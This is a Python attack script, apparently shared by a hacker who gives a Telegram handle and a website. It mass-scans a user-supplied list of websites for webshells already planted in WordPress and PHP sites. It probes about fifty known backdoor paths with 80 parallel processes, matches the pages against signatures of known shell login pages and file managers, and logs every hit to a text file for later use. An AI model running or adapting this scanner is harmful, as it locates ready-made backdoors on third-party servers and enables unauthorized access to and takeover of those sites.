import requests
import os
import subprocess
import sys
import threading
from multiprocessing import Pool
from colorama import Fore, init  

init(autoreset=True)

fr = "\033[38;5;124m"  
fg = Fore.GREEN
WHITE = "\033[1;37m" 
RESET = "\033[39m"

banner = f''' 
{fr}▓█████▄  █    ██  ▄████▄  ▄▄▄█████▓ █    ██▓██   ██▓▓█████  ███▄    █ 
{fr}▒██▀ ██▌ ██  ▓██▒▒██▀ ▀█  ▓  ██▒ ▓▒ ██  ▓██▒▒██  ██▒▓█   ▀  ██ ▀█   █ 
{fr}░██   █▌▓██  ▒██░▒▓█    ▄ ▒ ▓██░ ▒░▓██  ▒██░ ▒██ ██░▒███   ▓██  ▀█ ██▒
{fr}░▓█▄   ▌▓▓█  ░██░▒▓▓▄ ▄██▒░ ▓██▓ ░ ▓▓█  ░██░ ░ ▐██▓░▒▓█  ▄ ▓██▒  ▐▌██▒
{fr}░▒████▓ ▒▒█████▓ ▒ ▓███▀ ░  ▒██▒ ░ ▒▒█████▓  ░ ██▒▓░░▒████▒▒██░   ▓██░
{fr} ▒▒▓  ▒ ░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░  ▒ ░░   ░▒▓▒ ▒ ▒   ██▒▒▒ ░░ ▒░ ░░ ▒░   ▒ ▒ 
{fr} ░ ▒  ▒ ░░▒░ ░ ░   ░  ▒       ░    ░░▒░ ░ ░ ▓██ ░▒░  ░ ░  ░░ ░░   ░ ▒░
{fr} ░ ░  ░  ░░░ ░ ░ ░          ░       ░░░ ░ ░ ▒ ▒ ░░     ░      ░   ░ ░ 
{fr}   ░       ░     ░ ░                  ░     ░ ░        ░  ░         ░ 
{fr} ░               ░                          ░ ░                       

{fr}                  Telegram: @ductuyen2011
{fr}                  Website: https://ductuyensub.site/                                               
\033[0m
'''

lock = threading.Lock()

def url_domain(site):
    if not site.startswith(('http://', 'https://')):
        site = 'http://' + site if not site.startswith('www.') else 'http://www.' + site
    return site + '/' if not site.endswith('/') else site

def redzone(site):
    site = url_domain(site)
    paths = ['wp-content/themes/seotheme/db.php?u', 'wp-content/themes/pridmag/db.php?u', 'wp-content/plugins/linkpreview/db.php?u', 'wp-content/themes/gaukingo/db.php?u', 'wp-content/plugins/seoplugins/db.php?u', 'wp-content/themes/travelscape/json.php', 'wp-content/themes/aahana/json.php', 'wp-content/themes/travel/issue.php', 'about.php', 'xx.php', 'about.php?525', 'epinyins.php', 'wp-content/themes/digital-download/new.php', 'wp-admin/dropdown.php', 'wzy.php?action=door123', 'simple.php', 'install.php', 'dropdown.php', 'chosen.php?p=', 'mah.php', 'wp-admin/about.php', 'wp-content/about.php', 'wp-admin/install.php', 'wp-admin/js/about.php7', 'wp-content/install.php', 'wp-admin/user/about.php', 'wp-includes/install.php', 'wp-admin/images/admin.php', 'wp-includes/Text/about.php', 'wp-admin/network/admin.php', 'wp-admin/maint/atomlib.php', 'wp-admin/network/index.php', 'wp-content/plugins/index.php', 'wp-content/uploads/index.php', 'wp-content/themes/twentytwentythree/patterns/index.php', 'wp-content/plugins/core/include.php', 'wp-head.php', 'wp-content/themes/twenty/twenty.php', 'wp-admin/maint/about.php', 'wp-content/plugins/press/wp-class.php', 'fm1.php', 'wp-includes/random_compat/about.php', 'xleet.php', 'xl2023.php', 'xxl.php', 'x.php', 'xl.php', 'wp-admin/xl2023.php', 'wp-includes/xl2023.php', '.well-known/acme-challenge/iR7SzrsOUEP.php', '.well-known/pki-validation/iR7SzrsO UEP.php',]
    vuln_checks = ['Bypass Sh3ll', '<pre align=center><form method=post>Password<br><input type=password name=pass', '#0x1877', '#0x2525', 'Yanz Webshell!', 'Uname:', 'Simple Shell', 'MSQ_403', '>File Upload :<', '-rw-r--r--', '<img src=\"https://github.com/fluidicon.png\" width=\"30\" height=\"30\" alt=\"\">', '<title>#CLS-LEAK#</title>', '%PDF-0-1', 'postpass', '<title>请勿使用非法用途</title>', '<form method=post>Password<br><input type=password name=pass'] 
    for path in paths:
        url = site + path
        try:
            req = requests.get(url)
            for line in req.text.splitlines():
                for check in vuln_checks:
                    if check in line:
                        with lock:
                            print(f'\033[1;32mDucTuyen[Kun Tiger] : \033[1;37m{site}\033[1;32m Succefully ')
                            with open('DucTuyen_Shell.txt', 'a') as f:
                                f.write(url + '\n')
        except requests.exceptions.RequestException:
            continue
    else:
        print(f'{fr}DucTuyen[Kun Tiger] : \033[1;37m{site}{fr} Failed ')

def clear():
    if sys.platform.startswith('win'):
        subprocess.call('cls', shell=True)
    else:
        subprocess.call('clear', shell=True)

def run():
    print(banner)
    filename = input('\033[1;37m Enter List => ')
    try:
        with open(filename, 'r') as file:
            sites = [line.strip() for line in file]
    except FileNotFoundError:
        print('\n\033[1;37m[!] File Not Found')
        return None

    mp = Pool(80)  
    mp.map(redzone, sites) 
    mp.close()
    mp.join()

if __name__ == '__main__':
    clear()
    run()
